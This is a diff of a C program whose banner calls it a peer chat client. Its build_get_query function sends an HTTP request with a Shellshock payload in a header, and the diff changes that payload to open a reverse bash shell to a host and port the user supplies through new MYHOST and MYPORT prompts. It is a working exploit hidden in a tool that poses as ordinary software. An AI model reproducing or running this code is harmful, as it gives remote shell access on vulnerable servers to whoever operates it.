@@ -46,13 +46,12 @@ bool Done = false;
 char *SendBuffer;
 int BytesReceived;
 char *Buffer;
-
+int create_tcp_socket();
 void *connection_handler(void *socket_desc);
 void *connection_handler1(void *socket_desc);
 void *connection_handler2(void *socket_desc);
 char *get_ip(char *host);
 char *build_get_query(char *host, char *page);
-int create_tcp_socket();
 int books(void);
 int books2(void);
 
@@ -64,7 +63,7 @@ void iam()
 	  printf("\t\t| '--' || '--' || '--' || '--TO|| '--OL|| '--'S|\n");
 	  printf("\t\t`------'`------'`------'`------'`------'`------'\n");
 	  printf("\t\t Peer-Chat OpenSSL (Windows/Linux)  Version 1.1 \n");
-	  printf("%s \n",Versionx());
+	  printf("\t\t %s \n",Versionx());
 }
 
 char * getline2(void) {
@@ -184,6 +183,7 @@ char *cora;
 #define CHK_SSL(err) if ((err)==-1){ERR_print_errors_fp(stderr); exit(2);}
 
 struct sockaddr_in *remote;
+int nbytes = 100;
 int tmpres;
 char *ip;
 char *get;
@@ -192,18 +192,25 @@ char *host;
 char *page;
 char *port;
 char *service;
+char *myhost;
+char *myport;
+int host1;
+int page1;
+int port1;
+int service1;
+int myhost1;
+int myport1;
 pthread_t sniffer_thread;
 
 int thread0(void){
-	new_sock = (int*)malloc(1);
-	*new_sock = create_tcp_socket();
+		new_sock = (int*)malloc(1);
+		*new_sock = create_tcp_socket();
 	
-	if(pthread_create(&sniffer_thread,NULL,connection_handler,(void*) *new_sock) < 0){
-		perror("could not create thread");
-		return 1;
-	}
+		if(pthread_create(&sniffer_thread,NULL,connection_handler,(void*) *new_sock) < 0){
+			perror("could not create thread");
+		}
 	
-	pthread_join(sniffer_thread,NULL);
+		pthread_join(sniffer_thread,NULL);
 }
 
 int thread1(void){	
@@ -211,7 +218,6 @@ int thread1(void){
 		*new_sock = create_tcp_socket(); 
 		if(pthread_create(&sniffer_thread,NULL,connection_handler1,(void*) *new_sock) < 0){
 			perror("could not create thread");
-			return 1;
 		}
 	
 		pthread_join(sniffer_thread,NULL);   	
@@ -222,7 +228,6 @@ int thread2(void){
 		*new_sock = create_tcp_socket(); 
 		if(pthread_create(&sniffer_thread,NULL,connection_handler2,(void*) *new_sock) < 0){
 			perror("could not create thread");
-			return 1;
 		}
 	
 		pthread_join(sniffer_thread,NULL);	
@@ -271,20 +276,34 @@ int main(int argc, char **argv)
         break;
     case '6':
 	printf("HOST: \x1B[32m");
-	getchar();
-	host = getline2();
+	host1 = getline(&host, &nbytes, stdin);
+	//getchar();
+	//host = getline2();
 	printf("\x1b[0m");
 	printf("PAGE: \x1B[32m");
-	getchar();
-	page = getline2();    	
+	page1 = getline(&page, &nbytes, stdin);
+	//getchar();
+	//page = getline2();    	
 	printf("\x1b[0m");
 	printf("PORT: \x1B[32m");
-	getchar();
-	port = getline2();
+	port1 = getline(&port, &nbytes, stdin);
+	//getchar();
+	//port = getline2();
 	printf("\x1b[0m");
 	printf("SERVICE: \x1B[32m");
-	getchar();
-	service = getline2();
+	service1 = getline(&service, &nbytes, stdin);
+	//getchar();
+	//service = getline2();
+	printf("\x1b[0m");
+	printf("MYHOST: \x1B[32m");
+	myhost1 = getline(&myhost, &nbytes, stdin);
+	//getchar();
+	//myhost = getline2();
+	printf("\x1b[0m");
+	printf("MYPORT: \x1B[32m");
+	myport1 = getline(&myport, &nbytes, stdin);
+	//getchar();
+	//myport = getline2();
 	printf("\x1b[0m");
 	  thread0();
 	  goto Start;
@@ -850,7 +869,7 @@ char *build_get_query(char *host, char *page)
 {
   char *query;
   char *getpage = page;
-  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/127.0.0.1/8080 0>&1 : Connection: close:\r\n\r\n";
+  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/%s/%s 0>&1 : Connection: close:\r\n\r\n";
   
   if(getpage[0] == '/'){
     getpage = getpage + 1;
@@ -858,9 +877,9 @@ char *build_get_query(char *host, char *page)
   }
   // -5 is to consider the %s %s %s in tpl and the ending \0
   
-  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(tpl)-5);
+  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(myhost)+strlen(myport)+strlen(tpl)-5);
   
-  sprintf(query, tpl, getpage, host, USERAGENT);
+  sprintf(query, tpl, getpage, host, USERAGENT, myhost, myport);
   
   return query;
 }
